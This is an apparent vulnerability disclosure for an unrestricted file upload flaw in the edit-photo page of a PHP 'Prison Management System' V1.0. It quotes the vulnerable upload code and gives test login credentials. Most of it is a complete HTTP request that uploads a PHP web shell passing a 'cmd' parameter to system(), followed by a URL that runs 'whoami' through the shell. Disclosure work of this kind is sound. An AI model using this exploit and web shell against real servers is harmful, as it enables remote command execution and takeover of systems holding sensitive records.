Prison Management System - File upload on (/Employee/edit-photo.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/Employee/edit-photo.php
```

Crudentials:

```
http://url:8888/Account/login.php
releaseme@gmail.com
escobar2012
```



Using `$_FILES["avatar"]["name"]` as the filename on the server can lead to file upload attacks.

```
12: file_get_contents $image = addslashes(file_get_contents($_FILES['userImage']['tmp_name'])); 
requires:
8: if(isset($_POST['btnedit']))
```

```
15: move_uploaded_file move_uploaded_file($_FILES['userImage']['tmp_name'], "../uploadImage/Profile/" . $_FILES['userImage']['name']); 
requires:
8: if(isset($_POST['btnedit']))
```

Proof of vulnerability:

Upload a jpg, capture the packet, modify the file content to malicious code, and modify the file suffix to php

Request:

```
POST /Employee/edit-photo.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------195372709626593574313913679375
Content-Length: 643
Origin: http://localhost:8888
Sec-GPC: 1
Connection: close
Referer: http://localhost:8888/prison/Employee/edit-photo.php
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------195372709626593574313913679375
Content-Disposition: form-data; name="userImage"; filename="666.php"
Content-Type: image/jpeg

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>

-----------------------------195372709626593574313913679375
Content-Disposition: form-data; name="btnedit"


-----------------------------195372709626593574313913679375--
```

```
http://localhost:8888/uploadImage/Profile/666.php?cmd=whoami
```



